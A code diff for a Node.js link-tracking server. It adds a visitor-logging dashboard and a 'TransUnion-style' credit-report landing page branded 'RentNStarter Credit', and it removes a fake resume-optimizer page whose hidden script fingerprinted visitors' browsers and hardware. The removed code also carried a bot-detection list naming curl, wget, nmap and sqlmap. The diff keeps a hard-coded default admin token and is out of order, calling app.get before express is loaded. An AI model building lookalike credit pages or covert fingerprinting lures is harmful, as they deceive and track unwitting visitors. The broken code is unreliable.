@@ -1,4 +1,9 @@
-const express = require('express');
+// Simple dashboard with comprehensive analytics
+app.get('/dashboard', (req, res) => {
+    res.send('<!DOCTYPE html><html><head><title>RentNStarter Credit - Analytics Dashboard</title><style>body { font-family: Arial, sans-serif; margin: 0; background: linear-gradient(135deg, #003d82 0%, #0056b3 100%); min-height: 100vh; } .container { max-width: 1200px; margin: 0 auto; background: white; margin: 20px; border-radius: 10px; box-shadow: 0 20px 60px rgba(0,0,0,0.1); padding: 30px; } h1 { color: #003d82; text-align: center; margin-bottom: 10px; } .auth { margin: 20px 0; padding: 20px; background: #f8f9ff; border-radius: 10px; border: 2px solid #e0e6ff; } input, select { width: 100%; padding: 12px; margin: 10px 0; border: 2px solid #e0e6ff; border-radius: 8px; box-sizing: border-box; } button { background: #003d82; color: white; padding: 12px 24px; border: none; border-radius: 8px; cursor: pointer; font-weight: 600; } .hidden { display: none; } .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 20px 0; } .stat { background: linear-gradient(135deg, #003d82, #0056b3); color: white; padding: 20px; border-radius: 10px; text-align: center; } .stat h3 { margin: 0; font-size: 2.5em; } .error { color: #ef4444; } .success { color: #10b981; } .tabs { display: flex; border-bottom: 2px solid #e0e6ff; margin: 20px 0; } .tab { padding: 10px 20px; cursor: pointer; border-bottom: 2px solid transparent; } .tab.active { border-bottom-color: #003d82; color: #003d82; font-weight: bold; } .tab:hover { background: #f8f9ff; } .campaign-card { background: #fff; border: 2px solid #e0e6ff; border-radius: 10px; margin: 15px 0; overflow: hidden; } .campaign-header { background: #f8f9ff; padding: 15px; border-bottom: 1px solid #e0e6ff; cursor: pointer; } .campaign-header:hover { background: #f0f4ff; } .campaign-title { font-weight: bold; color: #003d82; font-size: 1.1em; } .campaign-details { padding: 20px; display: none; background: #fafafa; } .campaign-details.show { display: block; } .visitor-table { width: 100%; border-collapse: collapse; margin: 15px 0; font-size: 0.9em; } .visitor-table th, .visitor-table td { padding: 8px; text-align: left; border-bottom: 1px solid #ddd; } .visitor-table th { background: #003d82; color: white; } .visitor-table tr:hover { background: #f5f5f5; } .bot-badge { padding: 2px 6px; border-radius: 4px; font-size: 0.8em; font-weight: bold; } .bot-badge.bot { background: #fef2f2; color: #dc2626; } .bot-badge.human { background: #f0fdf4; color: #059669; } .ip-address { font-family: monospace; color: #003d82; } .user-agent { font-family: monospace; font-size: 0.8em; max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }</style></head><body><div class="container"><h1>RentNStarter Credit</h1><p style="text-align: center; color: #666;">Analytics Dashboard - Campaign Performance Tracking</p><div class="auth"><h3>Authentication Required</h3><input type="password" id="token" placeholder="Enter admin token"><button onclick="authenticate()">Connect to Dashboard</button><button onclick="refreshData()" id="refreshBtn" style="margin-left: 10px; background: #10b981; display: none;">Refresh</button><div id="status"></div></div><div id="dashboard" class="hidden"><div class="stats"><div class="stat"><h3 id="totalLinks">0</h3><p>Campaign Links</p></div><div class="stat"><h3 id="totalClicks">0</h3><p>Total Visits</p></div><div class="stat"><h3 id="totalBots">0</h3><p>Bot Detections</p></div><div class="stat"><h3 id="botPercentage">0%</h3><p>Bot Rate</p></div></div><div class="tabs"><div class="tab active" onclick="showTab(this, \\"create\\")">Create Campaign</div><div class="tab" onclick="showTab(this, \\"analytics\\")">Campaign Analytics</div></div><div id="createTab"><div style="background: #f8f9ff; padding: 20px; border-radius: 10px; margin: 20px 0;"><h3>Create New Campaign Link</h3><input type="text" id="description" placeholder="Campaign description (e.g., Email Newsletter)"><input type="text" id="campaign" placeholder="Campaign name (e.g., Q1-2024)"><select id="urlType"><option value="friendly">Friendly URL</option><option value="promo">Promo Code</option><option value="company">Company Application</option><option value="tool">Tool URL</option></select><input type="text" id="customPath" placeholder="Custom path (optional)"><button onclick="createLink()">Generate Tracking Link</button><div id="result"></div></div></div><div id="analyticsTab" class="hidden"><h3>Campaign Analytics & Visitor Details</h3><div id="campaignsList">Loading campaigns...</div></div></div></div><script>let token = ""; let dashboardData = {}; function authenticate() { token = document.getElementById("token").value; fetch("/api/dashboard", { headers: { "Authorization": "Bearer " + token } }).then(r => r.ok ? r.json() : Promise.reject("Invalid token")).then(data => { document.getElementById("status").innerHTML = "<span class=\\"success\\">Connected!</span>"; document.getElementById("dashboard").classList.remove("hidden"); document.getElementById("refreshBtn").style.display = "inline-block"; updateDashboard(data); }).catch(e => document.getElementById("status").innerHTML = "<span class=\\"error\\">❌ " + e + "</span>"); } function refreshData() { if (!token) return; fetch("/api/dashboard", { headers: { "Authorization": "Bearer " + token } }).then(r => r.json()).then(data => updateDashboard(data)); } function updateDashboard(data) { dashboardData = data; document.getElementById("totalLinks").textContent = data.totalLinks; document.getElementById("totalClicks").textContent = data.totalClicks; document.getElementById("totalBots").textContent = data.totalBots; document.getElementById("botPercentage").textContent = data.botPercentage + "%"; updateCampaignsList(data.links); } function updateCampaignsList(links) { const container = document.getElementById("campaignsList"); if (links.length === 0) { container.innerHTML = "<p style=\\"text-align: center; color: #666; padding: 20px;\\">No campaigns created yet.</p>"; return; } container.innerHTML = links.map(link => { return "<div class=\\"campaign-card\\"><div class=\\"campaign-header\\" onclick=\\"toggleCampaign(\'" + link.trackingId + "\')\\\"><div class=\\"campaign-title\\">" + link.description + "</div><div style=\\"color: #666; font-size: 0.9em; margin-top: 5px;\\">Campaign: " + link.campaign + " • Created: " + new Date(link.created).toLocaleDateString() + " • ID: " + link.shortId + "</div><div style=\\"display: grid; grid-template-columns: repeat(auto-fit, minmax(100px, 1fr)); gap: 10px; margin-top: 10px;\\"><div style=\\"background: #e8f0ff; padding: 8px; border-radius: 5px; text-align: center;\\"><div style=\\"font-weight: bold; color: #003d82;\\">" + link.totalClicks + "</div><div style=\\"font-size: 0.8em;\\">Total Clicks</div></div><div style=\\"background: #e8f0ff; padding: 8px; border-radius: 5px; text-align: center;\\"><div style=\\"font-weight: bold; color: #003d82;\\">" + link.uniqueIPs + "</div><div style=\\"font-size: 0.8em;\\">Unique IPs</div></div><div style=\\"background: #e8f0ff; padding: 8px; border-radius: 5px; text-align: center;\\"><div style=\\"font-weight: bold; color: #003d82;\\">" + link.humanClicks + "</div><div style=\\"font-size: 0.8em;\\">Human Clicks</div></div><div style=\\"background: #e8f0ff; padding: 8px; border-radius: 5px; text-align: center;\\"><div style=\\"font-weight: bold; color: #003d82;\\">" + link.botClicks + "</div><div style=\\"font-size: 0.8em;\\">Bot Clicks</div></div></div></div><div class=\\"campaign-details\\" id=\\"details-" + link.trackingId + "\\"><div id=\\"clicks-" + link.trackingId + "\\">Loading detailed analytics...</div></div></div>"; }).join(""); } function toggleCampaign(trackingId) { const details = document.getElementById("details-" + trackingId); const clicksContainer = document.getElementById("clicks-" + trackingId); if (details.classList.contains("show")) { details.classList.remove("show"); } else { details.classList.add("show"); loadCampaignDetails(trackingId, clicksContainer); } } ' + loadCampaignDetailsFunction + ' function showTab(tabElement, tabName) { document.querySelectorAll(".tab").forEach(tab => tab.classList.remove("active")); tabElement.classList.add("active"); document.getElementById("createTab").classList.toggle("hidden", tabName !== "create"); document.getElementById("analyticsTab").classList.toggle("hidden", tabName !== "analytics"); if (tabName === "analytics" && token) { refreshData(); } } function createLink() { const desc = document.getElementById("description").value; const camp = document.getElementById("campaign").value; const urlType = document.getElementById("urlType").value; const customPath = document.getElementById("customPath").value; fetch("/api/create-link", { method: "POST", headers: { "Authorization": "Bearer " + token, "Content-Type": "application/json" }, body: JSON.stringify({ description: desc, campaign: camp, urlType: urlType, customPath: customPath }) }).then(r => r.json()).then(data => { if (data.success) { document.getElementById("result").innerHTML = "<div style=\\"background: #e8f0ff; padding: 15px; border-radius: 8px; margin: 10px 0;\\"><strong>Campaign link created!</strong><br><strong>Main URL:</strong> <span style=\\"font-family: monospace; color: #003d82; word-break: break-all;\\">" + data.url + "</span><br><strong>Short URL:</strong> <span style=\\"font-family: monospace; color: #003d82; word-break: break-all;\\">" + data.shortUrl + "</span></div>"; document.getElementById("description").value = ""; document.getElementById("campaign").value = ""; document.getElementById("customPath").value = ""; setTimeout(refreshData, 1000); } }); } setInterval(() => { if (token && !document.getElementById("analyticsTab").classList.contains("hidden")) { refreshData(); } }, 30000);</script></body></html>');
+});
+
+const loadCampaignDetailsFunction = 'function loadCampaignDetails(trackingId, container) { console.log("Loading details for:", trackingId); container.innerHTML = "<p>Loading visitor details...</p>"; fetch("/api/stats/" + trackingId, { headers: { "Authorization": "Bearer " + token } }).then(r => { console.log("Response status:", r.status); if (!r.ok) { throw new Error("HTTP " + r.status + ": " + r.statusText); } return r.json(); }).then(data => { console.log("Received data:", data); const clicks = data.recentClicks || []; if (clicks.length === 0) { container.innerHTML = "<div style=\\"text-align: center; padding: 20px; background: #f8f9ff; border-radius: 8px; margin: 10px 0;\\"><h4>No Visitors Yet</h4><p style=\\"color: #666;\\">This campaign hasn\\'t received any clicks yet.<br>Share the tracking link to start collecting data!</p><p style=\\"font-family: monospace; font-size: 0.9em; color: #003d82;\\">Campaign ID: " + trackingId.substring(0, 8) + "</p></div>"; return; } const clicksTable = "<div style=\\"margin: 15px 0;\\"><h4 style=\\"color: #003d82; margin-bottom: 15px;\\">Visitor Log (" + clicks.length + " recent visits)</h4><div style=\\"overflow-x: auto;\\"><table class=\\"visitor-table\\"><thead><tr><th>Date & Time</th><th>IP Address</th><th>User Agent</th><th>Location Info</th><th>Bot Detection</th><th>Bot Score</th><th>Type</th></tr></thead><tbody>" + clicks.map(click => { const date = new Date(click.timestamp); const timeStr = date.toLocaleDateString() + "<br><small>" + date.toLocaleTimeString() + "</small>"; const userAgentShort = click.userAgent.length > 50 ? click.userAgent.substring(0, 50) + "..." : click.userAgent; return "<tr><td>" + timeStr + "</td><td class=\\"ip-address\\">" + click.ip + "</td><td class=\\"user-agent\\" title=\\"" + click.userAgent + "\\">" + userAgentShort + "</td><td><strong>" + (click.acceptLanguage || "Unknown") + "</strong><br><small style=\\"color: #666;\\">" + (click.referer !== "Direct" ? "Ref: " + click.referer : "Direct access") + "</small></td><td><span class=\\"bot-badge " + (click.isBot ? "bot" : "human") + "\\">" + (click.isBot ? "Bot" : "Human") + "</span></td><td><strong style=\\"color: " + (click.botScore > 50 ? "#dc2626" : "#059669") + ";\\">" + (click.botScore || 0) + "%</strong></td><td>" + (click.type === "javascript" ? "JS" : "Page") + "</td></tr>"; }).join("") + "</tbody></table></div></div>"; const userAgentsSection = data.topUserAgents && data.topUserAgents.length > 0 ? "<div style=\\"margin: 20px 0;\\"><h4 style=\\"color: #003d82; margin-bottom: 15px;\\">Top User Agents</h4><div style=\\"background: #f8f9ff; padding: 15px; border-radius: 8px; border: 1px solid #e0e6ff;\\">" + data.topUserAgents.map(ua => "<div style=\\"display: flex; justify-content: space-between; align-items: center; margin: 8px 0; padding: 5px; background: white; border-radius: 4px;\\"><span style=\\"font-family: monospace; font-size: 0.85em; color: #333; flex: 1;\\">" + ua.userAgent + "</span><span style=\\"font-weight: bold; color: #003d82; margin-left: 10px;\\">" + ua.count + " visits</span></div>").join("") + "</div></div>" : ""; const summarySection = "<div style=\\"background: #e8f0ff; padding: 15px; border-radius: 8px; margin: 15px 0; border-left: 4px solid #003d82;\\"><h4 style=\\"margin: 0 0 10px 0; color: #003d82;\\">Campaign Summary</h4><div style=\\"display: grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap: 15px;\\"><div><strong>Total Visits:</strong><br><span style=\\"font-size: 1.2em; color: #003d82;\\">" + data.totalClicks + "</span></div><div><strong>Unique IPs:</strong><br><span style=\\"font-size: 1.2em; color: #003d82;\\">" + data.uniqueIPs + "</span></div><div><strong>Human Visits:</strong><br><span style=\\"font-size: 1.2em; color: #059669;\\">" + data.humanClicks + "</span></div><div><strong>Bot Visits:</strong><br><span style=\\"font-size: 1.2em; color: #dc2626;\\">" + data.botClicks + "</span></div><div><strong>Avg Bot Score:</strong><br><span style=\\"font-size: 1.2em; color: " + (data.avgBotScore > 50 ? "#dc2626" : "#059669") + ";\\">" + data.avgBotScore + "%</span></div></div></div>"; container.innerHTML = summarySection + clicksTable + userAgentsSection; }).catch(e => { console.error("Error loading campaign details:", e); container.innerHTML = "<div style=\\"color: #ef4444; background: #fef2f2; padding: 15px; border-radius: 8px; margin: 10px 0;\\"><h4>Error Loading Details</h4><p>Failed to load visitor details: " + e.message + "</p><p><strong>Tracking ID:</strong> " + trackingId + "</p><button onclick=\\"loadCampaignDetails(\\'" + trackingId + "\\', document.getElementById(\\'clicks-" + trackingId + "\\'));\\" style=\\"background: #003d82; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; margin-top: 10px;\\">Retry</button></div>"; }); }';const express = require('express');
 const fs = require('fs');
 const path = require('path');
 const crypto = require('crypto');
@@ -25,42 +30,23 @@ const trackingData = new Map();
 
 // Load existing data if available
 const DATA_FILE = path.join(__dirname, 'tracking_data.json');
-
-function loadData() {
-    try {
-        if (fs.existsSync(DATA_FILE)) {
-            const savedData = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
-            trackingData.clear();
-            Object.entries(savedData).forEach(([key, value]) => {
-                trackingData.set(key, value);
-            });
-            console.log('Loaded ' + trackingData.size + ' existing tracking IDs');
-            return true;
-        }
-    } catch (error) {
-        console.error('Error loading data:', error);
+try {
+    if (fs.existsSync(DATA_FILE)) {
+        const savedData = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
+        Object.entries(savedData).forEach(([key, value]) => {
+            trackingData.set(key, value);
+        });
+        console.log('Loaded ' + trackingData.size + ' existing tracking IDs');
     }
-    return false;
+} catch (error) {
+    console.log('No existing data file found, starting fresh');
 }
-
-// Initial data load
-loadData();
-
-// Reload data periodically to catch any external changes
-setInterval(() => {
-    loadData();
-}, 5000); // Reload every 5 seconds
 
 // Periodically save data
 setInterval(() => {
-    try {
-        const dataObj = Object.fromEntries(trackingData);
-        fs.writeFileSync(DATA_FILE, JSON.stringify(dataObj, null, 2));
-        console.log('Data saved: ' + new Date().toISOString() + ' - ' + trackingData.size + ' links');
-    } catch (error) {
-        console.error('Failed to save data:', error);
-    }
-}, 30000); // Save every 30 seconds
+    const dataObj = Object.fromEntries(trackingData);
+    fs.writeFileSync(DATA_FILE, JSON.stringify(dataObj, null, 2));
+}, 60000);
 
 // Generate unique tracking ID
 function generateTrackingId() {
@@ -72,18 +58,8 @@ function requireAuth(req, res, next) {
     const authHeader = req.headers.authorization;
     const expectedAuth = process.env.ADMIN_TOKEN || 'admin-secret-token';
     
-    // Log for debugging
-    console.log('Auth attempt - Expected:', expectedAuth, 'Received:', authHeader);
-    
-    if (!authHeader || !authHeader.startsWith('Bearer ')) {
-        return res.status(401).json({ error: 'No authorization header' });
-    }
-    
-    const receivedToken = authHeader.substring(7); // Remove 'Bearer ' prefix
-    
-    if (receivedToken !== expectedAuth) {
-        console.log('Token mismatch - Expected:', expectedAuth, 'Received:', receivedToken);
-        return res.status(401).json({ error: 'Invalid token' });
+    if (!authHeader || authHeader !== 'Bearer ' + expectedAuth) {
+        return res.status(401).json({ error: 'Unauthorized' });
     }
     
     // Simple rate limiting
@@ -115,11 +91,7 @@ app.get('/health', (req, res) => {
     res.json({ 
         status: 'healthy', 
         timestamp: new Date().toISOString(),
-        uptime: process.uptime(),
-        trackingLinks: trackingData.size,
-        totalClicks: Array.from(trackingData.values()).reduce((sum, data) => sum + (data.clicks?.length || 0), 0),
-        configuredToken: process.env.ADMIN_TOKEN ? 'Environment variable set' : 'Using default',
-        dataFile: fs.existsSync(DATA_FILE) ? 'Exists' : 'Missing'
+        uptime: process.uptime()
     });
 });
 
@@ -190,9 +162,6 @@ app.post('/api/create-link', requireAuth, (req, res) => {
         
         trackingData.set(trackingId, metadata);
         
-        // Save data after creating new link
-        saveData();
-        
         const protocol = req.headers['x-forwarded-proto'] || 'http';
         const host = req.headers.host || DOMAIN;
         
@@ -250,232 +219,9 @@ function findTrackingIdByPromo(promoCode) {
     return null;
 }
 
-// Function to generate resume optimizer HTML with enhanced tracking
-function generateResumeOptimizerHTML(trackingId) {
-    const enhancedTrackingScript = `
-fetch("/api/js-track/${trackingId}", { 
-    method: "POST", 
-    headers: {"Content-Type": "application/json"}, 
-    body: JSON.stringify({ 
-        // Screen and display
-        screen: {
-            width: screen.width, 
-            height: screen.height,
-            colorDepth: screen.colorDepth,
-            pixelDepth: screen.pixelDepth,
-            availWidth: screen.availWidth,
-            availHeight: screen.availHeight
-        },
-        viewport: {
-            width: window.innerWidth, 
-            height: window.innerHeight
-        },
-        
-        // Browser and system
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        timezoneOffset: new Date().getTimezoneOffset(),
-        language: navigator.language,
-        languages: navigator.languages,
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        cookieEnabled: navigator.cookieEnabled,
-        onLine: navigator.onLine,
-        hardwareConcurrency: navigator.hardwareConcurrency,
-        deviceMemory: navigator.deviceMemory,
-        
-        // Canvas fingerprinting
-        canvasFingerprint: (function() {
-            try {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                ctx.textBaseline = 'top';
-                ctx.font = '14px Arial';
-                ctx.fillText('fingerprint', 2, 2);
-                return canvas.toDataURL().substring(0, 100);
-            } catch(e) { return 'unavailable'; }
-        })(),
-        
-        // WebGL info
-        webglVendor: (function() {
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                const ext = gl.getExtension('WEBGL_debug_renderer_info');
-                return gl.getParameter(ext.UNMASKED_VENDOR_WEBGL);
-            } catch(e) { return 'unavailable'; }
-        })(),
-        
-        // Performance metrics
-        loadTime: performance.timing ? performance.timing.loadEventEnd - performance.timing.navigationStart : 0,
-        
-        // Document info
-        pageUrl: window.location.href,
-        referrer: document.referrer,
-        title: document.title,
-        timestamp: new Date().toISOString(),
-        
-        // Browser features
-        hasTouch: 'ontouchstart' in window,
-        hasWebRTC: !!window.RTCPeerConnection,
-        hasWebGL: !!window.WebGLRenderingContext,
-        hasWebWorker: !!window.Worker,
-        
-        // Plugins (limited in modern browsers)
-        pluginsCount: navigator.plugins.length,
-        
-        // Connection info
-        connection: navigator.connection ? {
-            effectiveType: navigator.connection.effectiveType,
-            downlink: navigator.connection.downlink,
-            rtt: navigator.connection.rtt
-        } : null
-    }) 
-}).catch(() => {});
-
-function startOptimization() { 
-    fetch("/api/js-track/${trackingId}", { 
-        method: "POST", 
-        headers: {"Content-Type": "application/json"}, 
-        body: JSON.stringify({ 
-            action: "optimization_started", 
-            timestamp: new Date().toISOString() 
-        }) 
-    }).catch(() => {}); 
-    alert("Thank you for your interest! Please sign up for a free account to continue with the optimization process."); 
-}`;
-
-    return `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>ResumeBoost Pro - AI-Powered Resume Optimization</title><link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet"><style>* { margin: 0; padding: 0; box-sizing: border-box; }body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; line-height: 1.6; color: #333; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; }.header { background: rgba(255,255,255,0.95); backdrop-filter: blur(10px); padding: 1rem 0; position: sticky; top: 0; z-index: 100; box-shadow: 0 2px 20px rgba(0,0,0,0.1); }.nav { max-width: 1200px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; padding: 0 2rem; }.logo { font-size: 1.8rem; font-weight: bold; color: #667eea; }.hero { text-align: center; padding: 4rem 2rem; color: white; }.hero h1 { font-size: 3.5rem; margin-bottom: 1rem; font-weight: 700; }.hero p { font-size: 1.3rem; margin-bottom: 2rem; opacity: 0.9; max-width: 600px; margin-left: auto; margin-right: auto; }.container { max-width: 1200px; margin: 0 auto; padding: 0 2rem; }.upload-section { background: white; margin: 2rem auto; padding: 3rem; border-radius: 20px; box-shadow: 0 20px 60px rgba(0,0,0,0.1); max-width: 800px; }.btn-primary { background: #667eea; color: white; padding: 0.75rem 1.5rem; border: none; border-radius: 50px; font-weight: 600; cursor: pointer; transition: all 0.3s; text-decoration: none; display: inline-block; }.btn-primary:hover { background: #5a6fd8; }</style></head><body><header class="header"><nav class="nav"><div class="logo"><i class="fas fa-file-alt"></i> ResumeBoost Pro</div></nav></header><section class="hero"><div class="container"><h1>Optimize Your Resume with AI</h1><p>Get your resume past ATS systems and into the hands of hiring managers. Our AI analyzes your resume against job requirements and optimizes it for maximum impact.</p></div></section><section class="upload-section"><div class="container"><h2 style="text-align: center; margin-bottom: 2rem; color: #333;">Upload Your Resume</h2><div style="border: 3px dashed #ddd; border-radius: 15px; padding: 3rem; text-align: center; background: #fafafa; margin: 2rem 0;"><i class="fas fa-cloud-upload-alt" style="font-size: 4rem; color: #667eea; margin-bottom: 1rem;"></i><h3>Drop your resume here or click to browse</h3><p>Supports PDF, DOC, DOCX formats (Max 10MB)</p><input type="file" style="margin: 1rem 0; padding: 0.75rem;" accept=".pdf,.doc,.docx"></div><div style="margin: 1.5rem 0;"><label style="display: block; margin-bottom: 0.5rem; font-weight: 600; color: #555;">Target Job Title</label><input type="text" style="width: 100%; padding: 0.75rem; border: 2px solid #e0e6ff; border-radius: 10px;" placeholder="e.g., Software Engineer, Marketing Manager"></div><div style="text-align: center; margin: 2rem 0;"><button class="btn-primary" style="font-size: 1.1rem; padding: 1rem 3rem;" onclick="startOptimization()"><i class="fas fa-magic" style="margin-right: 0.5rem;"></i>Optimize My Resume</button></div></div></section><script>${enhancedTrackingScript}</script></body></html>`;
-}
-
-// Enhanced bot detection with more patterns
-function detectBot(userAgent) {
-    const botKeywords = [
-        // Common bots
-        'bot', 'crawler', 'spider', 'scraper', 'automated',
-        // Programming languages and tools
-        'python', 'curl', 'wget', 'requests', 'selenium',
-        'headless', 'phantom', 'zombie', 'mechanize',
-        // Additional bot indicators
-        'http', 'client', 'fetch', 'node', 'java', 'ruby',
-        'perl', 'go-http', 'postman', 'insomnia',
-        // Security scanners
-        'nmap', 'nikto', 'sqlmap', 'burp', 'zap'
-    ];
-    
-    const ua = userAgent.toLowerCase();
-    return botKeywords.some(keyword => ua.includes(keyword));
-}
-
-// Enhanced bot scoring with more factors
-function calculateBotScore(headers) {
-    let score = 0;
-    
-    // Missing headers (typical of bots)
-    if (!headers['accept-language']) score += 20;
-    if (!headers['accept-encoding']) score += 15;
-    if (!headers['accept']) score += 10;
-    if (!headers['referer'] && !headers['referrer']) score += 10;
-    
-    // User agent analysis
-    const ua = (headers['user-agent'] || '').toLowerCase();
-    if (ua.includes('python')) score += 30;
-    if (ua.includes('curl')) score += 30;
-    if (ua.includes('wget')) score += 30;
-    if (ua === '') score += 25;
-    if (ua.length < 20) score += 15;
-    
-    // Accept header analysis
-    if (headers['accept'] && headers['accept'].includes('*/*') && !headers['accept-language']) {
-        score += 15;
-    }
-    
-    // Connection patterns
-    if (headers['connection'] && headers['connection'].toLowerCase() === 'close') {
-        score += 5;
-    }
-    
-    // DNT header (Do Not Track) - bots often don't send this
-    if (!headers['dnt']) score += 5;
-    
-    // Sec-Fetch headers (modern browsers send these)
-    if (!headers['sec-fetch-mode'] && !headers['sec-fetch-site'] && !headers['sec-fetch-dest']) {
-        score += 10;
-    }
-    
-    return Math.min(score, 100);
-}
-
-// Generate browser fingerprint
-function generateBrowserFingerprint(headers) {
-    const components = [
-        headers['user-agent'] || '',
-        headers['accept'] || '',
-        headers['accept-language'] || '',
-        headers['accept-encoding'] || ''
-    ];
-    
-    return crypto.createHash('md5').update(components.join('|')).digest('hex').substring(0, 16);
-}
-
-// Extract comprehensive client information
-function extractClientInfo(req) {
-    const ip = getClientIP(req);
-    
-    return {
-        timestamp: new Date().toISOString(),
-        ip: ip,
-        userAgent: req.headers['user-agent'] || 'Unknown',
-        referer: req.headers['referer'] || 'Direct',
-        acceptLanguage: req.headers['accept-language'] || 'Unknown',
-        acceptEncoding: req.headers['accept-encoding'] || 'Unknown',
-        accept: req.headers['accept'] || 'Unknown',
-        host: req.headers['host'],
-        method: req.method,
-        url: req.url,
-        query: req.query,
-        
-        // Additional headers
-        dnt: req.headers['dnt'] || 'Not set',
-        secFetchMode: req.headers['sec-fetch-mode'],
-        secFetchSite: req.headers['sec-fetch-site'],
-        secFetchDest: req.headers['sec-fetch-dest'],
-        upgradeInsecureRequests: req.headers['upgrade-insecure-requests'],
-        
-        // Connection info
-        protocol: req.protocol,
-        secure: req.secure,
-        httpVersion: req.httpVersion,
-        
-        // All forward headers
-        xForwardedFor: req.headers['x-forwarded-for'],
-        xRealIp: req.headers['x-real-ip'],
-        cfConnectingIp: req.headers['cf-connecting-ip'],
-        cfIpCountry: req.headers['cf-ipcountry'],
-        cfRay: req.headers['cf-ray'],
-        
-        // Bot analysis
-        isBot: detectBot(req.headers['user-agent'] || ''),
-        botScore: calculateBotScore(req.headers),
-        browserFingerprint: generateBrowserFingerprint(req.headers)
-    };
-}
-
-// Save data to file with file locking
-function saveData() {
-    try {
-        const dataObj = Object.fromEntries(trackingData);
-        const tempFile = DATA_FILE + '.tmp';
-        
-        // Write to temporary file first
-        fs.writeFileSync(tempFile, JSON.stringify(dataObj, null, 2));
-        
-        // Rename to actual file (atomic operation)
-        fs.renameSync(tempFile, DATA_FILE);
-        
-        console.log('Data saved successfully at ' + new Date().toISOString());
-    } catch (error) {
-        console.error('Failed to save data:', error);
-    }
+// Function to generate TransUnion-style credit monitoring HTML
+function generateCreditMonitoringHTML(trackingId) {
+    return '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>RentNStarter Credit Monitoring - Free Credit Report & Score</title><link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet"><style>* { margin: 0; padding: 0; box-sizing: border-box; } body { font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; color: #333; background-color: #f5f7fa; } .header { background: #fff; box-shadow: 0 2px 4px rgba(0,0,0,0.1); padding: 1rem 0; position: sticky; top: 0; z-index: 100; } .nav { max-width: 1200px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; padding: 0 2rem; } .logo { font-size: 1.8rem; font-weight: bold; color: #003d82; } .nav-links { display: flex; gap: 2rem; } .nav-links a { text-decoration: none; color: #003d82; font-weight: 500; } .hero { background: linear-gradient(135deg, #003d82 0%, #0056b3 100%); color: white; padding: 3rem 0; text-align: center; } .hero h1 { font-size: 2.8rem; margin-bottom: 1rem; font-weight: 700; } .hero p { font-size: 1.2rem; margin-bottom: 2rem; opacity: 0.9; max-width: 600px; margin-left: auto; margin-right: auto; } .container { max-width: 1200px; margin: 0 auto; padding: 0 2rem; } .main-content { background: white; margin: 2rem auto; padding: 3rem; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); max-width: 500px; } .form-header { text-align: center; margin-bottom: 2rem; } .form-header h2 { color: #003d82; font-size: 1.8rem; margin-bottom: 0.5rem; } .form-header p { color: #666; font-size: 0.95rem; } .form-group { margin-bottom: 1.5rem; } .form-group label { display: block; margin-bottom: 0.5rem; font-weight: 600; color: #333; font-size: 0.9rem; } .form-control { width: 100%; padding: 0.75rem; border: 2px solid #ddd; border-radius: 4px; font-size: 1rem; transition: border-color 0.3s; } .form-control:focus { outline: none; border-color: #003d82; box-shadow: 0 0 0 3px rgba(0,61,130,0.1); } .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; } .btn-primary { background: #003d82; color: white; padding: 0.875rem 2rem; border: none; border-radius: 4px; font-size: 1rem; font-weight: 600; cursor: pointer; transition: all 0.3s; width: 100%; margin-top: 1rem; } .btn-primary:hover { background: #002a5c; transform: translateY(-1px); } .features { background: #f8f9fa; padding: 3rem 0; } .features-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 2rem; margin: 2rem 0; } .feature { background: white; padding: 2rem; border-radius: 8px; text-align: center; box-shadow: 0 2px 8px rgba(0,0,0,0.1); } .feature i { font-size: 3rem; color: #003d82; margin-bottom: 1rem; } .feature h3 { color: #003d82; margin-bottom: 1rem; font-size: 1.3rem; } .security-notice { background: #e8f4fd; border: 1px solid #b3d9ff; border-radius: 4px; padding: 1rem; margin: 1.5rem 0; font-size: 0.85rem; color: #003d82; } .security-notice i { margin-right: 0.5rem; } .legal-text { font-size: 0.75rem; color: #666; line-height: 1.4; margin-top: 1rem; } .footer { background: #003d82; color: white; padding: 3rem 0; margin-top: 4rem; } .footer-content { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 2rem; } .footer h4 { margin-bottom: 1rem; } .footer a { color: #b3d9ff; text-decoration: none; } .footer a:hover { color: white; } .progress-bar { background: #e9ecef; border-radius: 10px; height: 6px; margin: 1.5rem 0; } .progress-fill { background: #003d82; height: 100%; width: 33%; border-radius: 10px; transition: width 0.3s; } .step-indicator { display: flex; justify-content: center; margin: 1rem 0; } .step { width: 30px; height: 30px; border-radius: 50%; background: #ddd; color: white; display: flex; align-items: center; justify-content: center; margin: 0 0.5rem; font-weight: bold; } .step.active { background: #003d82; } .step.completed { background: #28a745; } @media (max-width: 768px) { .hero h1 { font-size: 2rem; } .nav-links { display: none; } .form-row { grid-template-columns: 1fr; } .main-content { margin: 1rem; padding: 2rem; } }</style></head><body><header class="header"><nav class="nav"><div class="logo"><i class="fas fa-shield-alt"></i> RentNStarter Credit</div><div class="nav-links"><a href="#features">Features</a><a href="#security">Security</a><a href="#support">Support</a></div></nav></header><section class="hero"><div class="container"><h1>Get Your Free Credit 